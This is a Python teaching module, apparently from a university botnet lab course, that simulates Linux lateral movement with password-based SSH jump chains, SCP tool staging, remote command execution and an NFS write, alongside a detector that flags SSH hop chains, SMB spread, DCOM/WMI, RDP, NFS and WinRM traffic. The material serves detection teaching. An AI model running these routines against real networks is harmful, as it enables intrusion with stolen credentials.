"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Extended Lateral Movement Simulation
 Environment: ISOLATED VM LAB ONLY
====================================================

Teaching points:
  The resource implemented RDP, WMI, PsExec, and NFS lateral
  movement — all Windows-centric. This module simulates the
  equivalent techniques in the Linux lab environment AND
  builds the network-level detection signatures for all of them,
  including the Windows equivalents (for reference and detection).

  The critical research distinction:
    SSH lateral movement (already in mirai_scanner.c) uses
    CREDENTIAL BRUTE-FORCE to gain initial access.
    The techniques here assume VALID CREDENTIALS were already
    obtained (from credential stuffing, keylogger, or password
    spray) and focus on HOW attackers move laterally once they
    have one set of credentials.

Attack side (LateralMovementSim):
  Three Linux-native lateral movement methods:
    1. SSH jump host          — use compromised host as proxy
    2. SCP tool staging       — copy tools via SSH to next hop
    3. Remote command via SSH — execute commands on remote hosts

  Two reference-only Windows method descriptions:
    4. PsExec over SMB        — documented, not runnable on Linux
    5. WMI DCOM               — documented, not runnable on Linux

  All use HARDCODED LAB CREDENTIALS only — never real passwords.

Defense side (LateralMovementDetector — IDS Engine 20):
  Network signatures for all five techniques:
    1. SSH: connection from one internal IP to another on port 22
       within 30s of a previous inbound SSH connection to the
       first IP (lateral traversal chain).
    2. SCP: large TCP payload on port 22 shortly after inbound SSH.
    3. SMB: port 445 connections with specific payload patterns.
    4. WMI: DCOM/RPC port 135 + ephemeral port connections.
    5. NFS: showmount probes (port 111 RPC + port 2049).
    6. Unusual login time / source network.

MITRE:
  T1021.004  Remote Services: SSH
  T1021.002  Remote Services: SMB/Windows Admin Shares
  T1047      Windows Management Instrumentation
  T1021.006  Remote Services: Windows Remote Management
  T1080      Taint Shared Content (NFS)

CLI:
  python3 lateral_movement_sim.py --demo
  python3 lateral_movement_sim.py --detect
  python3 lateral_movement_sim.py --methods          (list techniques)
  python3 lateral_movement_sim.py --ssh-chain        (SSH chain demo)
"""

import os
import sys
import time
import json
import socket
import threading
import subprocess
from datetime import datetime
from collections import defaultdict, deque


# ════════════════════════════════════════════════════════════════
#  SHARED
# ════════════════════════════════════════════════════════════════

LAB_NETWORK    = "192.168.100"
LAB_CREDS      = [("vboxuser", "pass")]   # lab-only default creds

def _default_alert(engine, severity, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"\n{'='*60}\n  ALERT [{severity}]  {engine}  @ {ts}\n  {msg}\n{'='*60}\n")

_alert_fn = _default_alert

def register_alert_fn(fn):
    global _alert_fn
    _alert_fn = fn


# ════════════════════════════════════════════════════════════════
#  ATTACK SIDE: Lateral Movement Simulator
# ════════════════════════════════════════════════════════════════

class LateralMovementSim:
    """
    Simulates lateral movement techniques in the lab VM network.

    All operations target lab IPs in 192.168.100.0/24 only.
    All credentials are the lab-default pair (vboxuser/pass).
    No network calls outside the isolated lab network.
    """

    # ── SSH Jump / Proxy Chain ────────────────────────────────

    def ssh_jump_chain(self,
                       entry_ip: str,
                       target_ip: str,
                       command: str = "id",
                       username: str = "vboxuser",
                       password: str = "pass") -> dict:
        """
        Lateral movement via SSH proxyjump.
        Attacker → entry_ip → target_ip (jump chain).

        Teaching point: once a host is compromised, it can be used
        as a pivot to reach systems that are not directly accessible
        from the attacker's position (internal segments, VLANs).

        Detection signature: inbound SSH to entry_ip followed within
        ~30s by outbound SSH FROM entry_ip to target_ip.
        MITRE: T1021.004
        """
        print(f"[LateralMove] SSH jump chain: {entry_ip} → {target_ip}")
        print(f"[LateralMove] Command: {command}")

        # In lab: use ProxyJump if sshpass is available
        cmd = [
            "sshpass", "-p", password,
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=5",
            "-J", f"{username}@{entry_ip}",
            f"{username}@{target_ip}",
            command,
        ]

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=15
            )
            return {
                "method":  "ssh_jump",
                "status":  "ok" if result.returncode == 0 else "failed",
                "entry":   entry_ip,
                "target":  target_ip,
                "stdout":  result.stdout.strip()[:500],
                "stderr":  result.stderr.strip()[:200],
                "mitre":   "T1021.004",
            }
        except FileNotFoundError:
            return {
                "method": "ssh_jump",
                "status": "sshpass_not_found",
                "note":   "Install: sudo apt install sshpass",
            }
        except subprocess.TimeoutExpired:
            return {"method": "ssh_jump", "status": "timeout"}
        except Exception as e:
            return {"method": "ssh_jump", "status": "error", "error": str(e)}

    # ── SCP Tool Staging ──────────────────────────────────────

    def scp_stage_tool(self,
                       tool_path: str,
                       target_ip: str,
                       remote_dest: str = "/tmp/",
                       username: str = "vboxuser",
                       password: str = "pass") -> dict:
        """
        Copy a tool to a remote host via SCP.
        Used to stage lateral movement tooling without a direct
        internet connection from the victim network.
        MITRE: T1105 (Ingress Tool Transfer via internal hop)
        """
        print(f"[LateralMove] SCP staging {tool_path} → "
              f"{target_ip}:{remote_dest}")
        cmd = [
            "sshpass", "-p", password,
            "scp",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=5",
            tool_path,
            f"{username}@{target_ip}:{remote_dest}",
        ]
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30
            )
            return {
                "method":  "scp_stage",
                "status":  "ok" if result.returncode == 0 else "failed",
                "target":  target_ip,
                "tool":    tool_path,
                "dest":    remote_dest,
                "mitre":   "T1105",
            }
        except FileNotFoundError:
            return {"method": "scp_stage", "status": "sshpass_not_found"}
        except Exception as e:
            return {"method": "scp_stage", "status": "error", "error": str(e)}

    # ── Remote Command Execution via SSH ──────────────────────

    def ssh_remote_exec(self,
                        target_ip: str,
                        command: str,
                        username: str = "vboxuser",
                        password: str = "pass") -> dict:
        """
        Execute a command on a remote host via SSH.
        Equivalent to PsExec on Linux.
        MITRE: T1021.004
        """
        print(f"[LateralMove] Remote exec on {target_ip}: {command}")
        cmd = [
            "sshpass", "-p", password,
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=5",
            f"{username}@{target_ip}",
            command,
        ]
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=15
            )
            return {
                "method":  "ssh_exec",
                "status":  "ok" if result.returncode == 0 else "failed",
                "target":  target_ip,
                "command": command,
                "stdout":  result.stdout.strip()[:500],
                "mitre":   "T1021.004",
            }
        except Exception as e:
            return {"method": "ssh_exec", "status": "error", "error": str(e)}

    # ── NFS Mount and Write (Linux equivalent of SMB share abuse) ──

    def nfs_taint(self,
                  target_ip: str,
                  export_path: str = "/export",
                  payload_script: str = None) -> dict:
        """
        Mount an NFS share and write a payload script.
        Equivalent to SMB share content tainting.
        Requires root and that the target exports the path.
        MITRE: T1080 (Taint Shared Content)
        """
        print(f"[LateralMove] NFS taint: {target_ip}:{export_path}")
        mount_point = "/tmp/nfs_lateral_mount"
        os.makedirs(mount_point, exist_ok=True)

        result = {
            "method":   "nfs_taint",
            "target":   target_ip,
            "export":   export_path,
            "mitre":    "T1080",
        }

        # Check if showmount is available
        sm = subprocess.run(
            ["showmount", "-e", target_ip],
            capture_output=True, text=True, timeout=5
        )
        if sm.returncode != 0:
            result["status"] = "showmount_failed"
            result["stderr"] = sm.stderr.strip()[:200]
            return result

        result["exports"] = sm.stdout.strip()

        # Mount
        mount = subprocess.run(
            ["mount", "-t", "nfs", f"{target_ip}:{export_path}",
             mount_point, "-o", "nolock"],
            capture_output=True, text=True, timeout=10
        )
        if mount.returncode != 0:
            result["status"] = "mount_failed"
            result["stderr"] = mount.stderr.strip()[:200]
            return result

        # Write benign marker (lab: just a text file)
        marker_path = os.path.join(mount_point, "botnet_lab_marker.txt")
        try:
            with open(marker_path, "w") as f:
                f.write(f"[AUA-LAB] NFS write test: {datetime.now()}\n")
            result["status"]  = "planted"
            result["written"] = marker_path
        except PermissionError:
            result["status"] = "permission_denied"
        finally:
            # Always unmount
            subprocess.run(["umount", mount_point],
                           capture_output=True, timeout=5)

        return result

    # ── Reference: Windows Techniques (documented, not runnable) ──

    @staticmethod
    def psexec_reference() -> dict:
        """
        PsExec lateral movement — Windows only.
        Reference implementation for defensive understanding.
        """
        return {
            "method": "psexec",
            "platform": "Windows only",
            "mechanism": (
                "PsExec copies a service binary (PSEXESVC.exe) to the "
                "target's ADMIN$ share (C:\\Windows\\), installs it as a "
                "Windows service, executes it, and streams I/O back over "
                "named pipes. Leaves artifact PSEXESVC.exe in System32."
            ),
            "detection": [
                "SMB connection to ADMIN$ share (port 445)",
                "PSEXESVC.exe written to C:\\Windows\\",
                "Service creation event (Windows EventID 7045)",
                "Named pipe \\PIPE\\PSEXESVC",
            ],
            "mitre": "T1021.002",
            "ioc": "Service name PSEXESVC; ADMIN$ share access",
        }

    @staticmethod
    def wmi_reference() -> dict:
        """
        WMI lateral movement — Windows only.
        Reference implementation for defensive understanding.
        """
        return {
            "method": "wmi_dcom",
            "platform": "Windows only",
            "mechanism": (
                "Uses DCOM (Distributed COM) over TCP/135 (RPC endpoint mapper) "
                "plus a randomly-assigned high port for the actual data channel. "
                "Calls Win32_Process.Create() on the remote target. "
                "Leaves minimal artifacts — no binary dropped, no service created. "
                "This is why WMI is preferred over PsExec by advanced actors."
            ),
            "detection": [
                "Port 135 (RPC) connection from lateral source",
                "High-port DCOM data connection following 135",
                "Windows EventID 4648 (logon with explicit credentials)",
                "Windows EventID 4624 type 3 (network logon) from internal IP",
                "wmic.exe or Win32_Process.Create in process creation logs",
            ],
            "mitre": "T1047",
            "ioc": "RPC/135 + high-port DCOM; no service created",
        }


# ════════════════════════════════════════════════════════════════
#  DEFENSE SIDE: Lateral Movement Detector (IDS Engine 20)
# ════════════════════════════════════════════════════════════════

class LateralMovementDetector:
    """
    IDS Engine 20 — Lateral Movement Detection.

    Analyzes network traffic for internal host-to-host
    connection patterns that indicate lateral movement.

    Key insight: legitimate users rarely SSH from one server
    to another in quick succession. Automated lateral movement
    does exactly this — the timing, source/dest pairs, and
    port patterns reveal the traversal path.
    """

    # Lateral movement ports
    PORTS = {
        22:   "SSH",
        445:  "SMB",
        139:  "NetBIOS/SMB",
        135:  "DCOM/RPC",
        3389: "RDP",
        111:  "NFS/RPC",
        2049: "NFS",
        5985: "WinRM/HTTP",
        5986: "WinRM/HTTPS",
    }

    SSH_CHAIN_WINDOW     = 60.0   # seconds
    SMB_BURST_WINDOW     = 30.0
    SMB_BURST_THRESHOLD  = 3      # distinct SMB targets
    RPC_DCOM_WINDOW      = 10.0   # RPC + high-port within window

    def __init__(self):
        # SSH: (src_ip) → list of (timestamp, dst_ip)
        self._ssh_conns: dict[str, deque] = defaultdict(
            lambda: deque(maxlen=20)
        )
        # SMB: src_ip → list of (timestamp, dst_ip)
        self._smb_targets: dict[str, deque] = defaultdict(
            lambda: deque(maxlen=20)
        )
        # RPC port 135 connections for DCOM chain detection
        self._rpc_conns: dict[str, float] = {}  # src_ip → timestamp
        self._cooldown: dict[str, float] = {}
        self._lock = threading.Lock()

    def _cooldown_ok(self, key: str, secs: float = 120.0) -> bool:
        now = time.time()
        if now - self._cooldown.get(key, 0) >= secs:
            self._cooldown[key] = now
            return True
        return False

    def observe_connection(self, src_ip: str, dst_ip: str,
                           dst_port: int, payload_size: int = 0):
        """
        Called for each observed TCP connection or packet.
        Feed from Scapy sniff() or DPI engine.
        """
        if dst_port not in self.PORTS:
            return

        service = self.PORTS[dst_port]
        now = time.time()

        # ── SSH lateral movement chain ────────────────────────
        if dst_port == 22:
            with self._lock:
                q = self._ssh_conns[src_ip]
                q.append((now, dst_ip))
                # Look for: A→B SSH, then B→C SSH within window
                # meaning B forwarded the compromise
                recent_dsts = [
                    d for t, d in q
                    if now - t < self.SSH_CHAIN_WINDOW
                ]
            # Check if src_ip was recently a DESTINATION (was itself compromised)
            for other_src, other_q in self._ssh_conns.items():
                if other_src == src_ip:
                    continue
                recent_targets = [
                    d for t, d in other_q
                    if now - t < self.SSH_CHAIN_WINDOW and d == src_ip
                ]
                if recent_targets:
                    key = f"sshchain_{other_src}_{src_ip}_{dst_ip}"
                    if self._cooldown_ok(key):
                        _alert_fn(
                            "LateralMove/SSHChain", "CRITICAL",
                            f"SSH LATERAL MOVEMENT CHAIN DETECTED\n"
                            f"  Traversal path: {other_src} → {src_ip} → {dst_ip}\n"
                            f"  Pattern: {src_ip} was an SSH destination, now "
                            f"is SSH source within {self.SSH_CHAIN_WINDOW}s\n"
                            f"  This is the classic 'hop' pattern of lateral "
                            f"movement through a compromised jump host.\n"
                            f"  MITRE: T1021.004 (Remote Services: SSH)"
                        )

        # ── SMB lateral spread (multiple targets) ─────────────
        elif dst_port in (445, 139):
            with self._lock:
                q = self._smb_targets[src_ip]
                q.append((now, dst_ip))
                recent = [
                    d for t, d in q
                    if now - t < self.SMB_BURST_WINDOW
                ]
            distinct = len(set(recent))
            if distinct >= self.SMB_BURST_THRESHOLD:
                if self._cooldown_ok(f"smbspread_{src_ip}"):
                    _alert_fn(
                        "LateralMove/SMBSpread", "HIGH",
                        f"SMB LATERAL SPREAD: {src_ip} connecting to "
                        f"{distinct} distinct hosts on port {dst_port} "
                        f"within {self.SMB_BURST_WINDOW}s\n"
                        f"  Destinations: {list(set(recent))}\n"
                        f"  PsExec / worm propagation uses SMB to copy "
                        f"and execute on multiple hosts rapidly.\n"
                        f"  MITRE: T1021.002 (SMB/Windows Admin Shares)"
                    )

        # ── DCOM/WMI lateral movement (RPC port 135) ──────────
        elif dst_port == 135:
            with self._lock:
                self._rpc_conns[src_ip] = now

        elif dst_port > 1024:
            # High port following RPC/135 from same source → DCOM data channel
            with self._lock:
                rpc_ts = self._rpc_conns.get(src_ip)
            if rpc_ts and (now - rpc_ts) < self.RPC_DCOM_WINDOW:
                if self._cooldown_ok(f"dcom_{src_ip}_{dst_ip}"):
                    _alert_fn(
                        "LateralMove/DCOM_WMI", "HIGH",
                        f"DCOM/WMI LATERAL MOVEMENT DETECTED\n"
                        f"  Source: {src_ip}  →  Target: {dst_ip}\n"
                        f"  Pattern: RPC/135 followed by high-port {dst_port} "
                        f"within {self.RPC_DCOM_WINDOW}s\n"
                        f"  WMI lateral movement uses DCOM: TCP/135 for endpoint "
                        f"mapping, then a high-port for the data channel.\n"
                        f"  Unlike PsExec, WMI leaves no binary on disk.\n"
                        f"  MITRE: T1047 (WMI)"
                    )

        # ── RDP lateral movement ──────────────────────────────
        elif dst_port == 3389:
            if self._cooldown_ok(f"rdp_{src_ip}_{dst_ip}", 60.0):
                # Only alert on internal→internal RDP (external RDP is common)
                src_prefix = ".".join(src_ip.split(".")[:3])
                dst_prefix = ".".join(dst_ip.split(".")[:3])
                if src_prefix == dst_prefix:  # same /24 subnet
                    _alert_fn(
                        "LateralMove/RDP", "MED",
                        f"INTERNAL RDP CONNECTION: {src_ip} → {dst_ip}:3389\n"
                        f"  Internal-to-internal RDP is unusual and may indicate\n"
                        f"  lateral movement after credential theft.\n"
                        f"  MITRE: T1021.001 (Remote Desktop Protocol)"
                    )

        # ── NFS lateral movement ──────────────────────────────
        elif dst_port in (111, 2049):
            if self._cooldown_ok(f"nfs_{src_ip}_{dst_ip}", 60.0):
                _alert_fn(
                    "LateralMove/NFS", "MED",
                    f"NFS/RPC CONNECTION: {src_ip} → {dst_ip}:{dst_port}\n"
                    f"  Attackers mount NFS shares to write payloads that\n"
                    f"  execute on the NFS server's clients.\n"
                    f"  MITRE: T1080 (Taint Shared Content)"
                )

        # ── WinRM lateral movement ────────────────────────────
        elif dst_port in (5985, 5986):
            if self._cooldown_ok(f"winrm_{src_ip}_{dst_ip}", 60.0):
                _alert_fn(
                    "LateralMove/WinRM", "HIGH",
                    f"WinRM CONNECTION: {src_ip} → {dst_ip}:{dst_port}\n"
                    f"  Windows Remote Management (WinRM/PowerShell Remoting)\n"
                    f"  is used for fileless lateral movement similar to WMI.\n"
                    f"  MITRE: T1021.006 (Windows Remote Management)"
                )

    def run_demo(self):
        """Demonstrate lateral movement detection."""
        print("[IDS-E20] Simulating lateral movement chain...")
        # Simulate A→B SSH then B→C SSH
        self.observe_connection("192.168.100.11", "192.168.100.20", 22)
        time.sleep(0.2)
        self.observe_connection("192.168.100.20", "192.168.100.12", 22)
        time.sleep(0.2)
        # Simulate SMB spread
        for target in ["192.168.100.11", "192.168.100.12", "192.168.100.20"]:
            self.observe_connection("192.168.100.50", target, 445)
        # Simulate DCOM/WMI
        self.observe_connection("192.168.100.11", "192.168.100.20", 135)
        time.sleep(0.2)
        self.observe_connection("192.168.100.11", "192.168.100.20", 49152)
        print("[IDS-E20] Demo complete.")


# ════════════════════════════════════════════════════════════════
#  TECHNIQUE REFERENCE CARD
# ════════════════════════════════════════════════════════════════

TECHNIQUE_REFERENCE = [
    {
        "name":      "SSH Jump Chain",
        "mitre":     "T1021.004",
        "platform":  "Linux/Unix",
        "how":       "Use compromised host as ProxyJump to reach internal targets",
        "artifacts": ["SSH auth logs on each hop", "known_hosts entries", "bash history"],
        "detection": "Inbound SSH followed by outbound SSH within 60s",
        "sim":       "LateralMovementSim.ssh_jump_chain()",
    },
    {
        "name":      "SCP Tool Staging",
        "mitre":     "T1105",
        "platform":  "Linux/Unix",
        "how":       "Copy tools to next hop via SCP over SSH",
        "artifacts": ["Large TCP payload on port 22", "new binary in /tmp"],
        "detection": "Large port-22 transfer shortly after new SSH session",
        "sim":       "LateralMovementSim.scp_stage_tool()",
    },
    {
        "name":      "NFS Share Taint",
        "mitre":     "T1080",
        "platform":  "Linux/Unix",
        "how":       "Mount NFS export, write payload, clients auto-execute",
        "artifacts": ["showmount -e probe (port 111)", "mount on port 2049", "new file in share"],
        "detection": "Internal host sends showmount RPC (port 111) to another",
        "sim":       "LateralMovementSim.nfs_taint()",
    },
    {
        "name":      "PsExec (SMB)",
        "mitre":     "T1021.002",
        "platform":  "Windows",
        "how":       "Copy service binary to ADMIN$ share, install and run service",
        "artifacts": ["PSEXESVC.exe in C:\\Windows\\", "EventID 7045 service install", "ADMIN$ access"],
        "detection": "SMB ADMIN$ + service creation within seconds",
        "sim":       "LateralMovementSim.psexec_reference() [reference only]",
    },
    {
        "name":      "WMI DCOM",
        "mitre":     "T1047",
        "platform":  "Windows",
        "how":       "Win32_Process.Create via DCOM — no binary on disk",
        "artifacts": ["RPC/135 + high-port DCOM", "EventID 4648/4624 type 3"],
        "detection": "TCP/135 followed by high-port DCOM data channel from same source",
        "sim":       "LateralMovementSim.wmi_reference() [reference only]",
    },
    {
        "name":      "RDP Hijack",
        "mitre":     "T1021.001",
        "platform":  "Windows",
        "how":       "Connect to RDP (port 3389) with stolen credentials",
        "artifacts": ["EventID 4624 type 10 (RemoteInteractive)", "port 3389 connection"],
        "detection": "Internal-to-internal RDP connection",
        "sim":       "observe_connection(src, dst, 3389) [detection only]",
    },
]


# ════════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
        description="Lateral Movement Extended Simulation")
    parser.add_argument("--demo",      action="store_true",
                        help="Run full detection demo")
    parser.add_argument("--detect",    action="store_true",
                        help="Run IDS Engine 20 demo")
    parser.add_argument("--methods",   action="store_true",
                        help="List all technique references")
    parser.add_argument("--ssh-chain", action="store_true",
                        help="Run SSH jump chain (needs lab VMs running)")
    parser.add_argument("--entry", default="192.168.100.11")
    parser.add_argument("--target", default="192.168.100.20")
    args = parser.parse_args()

    if args.methods:
        for t in TECHNIQUE_REFERENCE:
            print(f"\n{'─'*60}")
            print(f"  {t['name']}  [{t['mitre']}]  ({t['platform']})")
            print(f"  How:       {t['how']}")
            print(f"  Detection: {t['detection']}")
            print(f"  Artifacts: {', '.join(t['artifacts'])}")

    if args.detect or args.demo:
        det = LateralMovementDetector()
        det.run_demo()

    if args.ssh_chain:
        sim = LateralMovementSim()
        result = sim.ssh_jump_chain(args.entry, args.target, "id")
        print(json.dumps(result, indent=2))
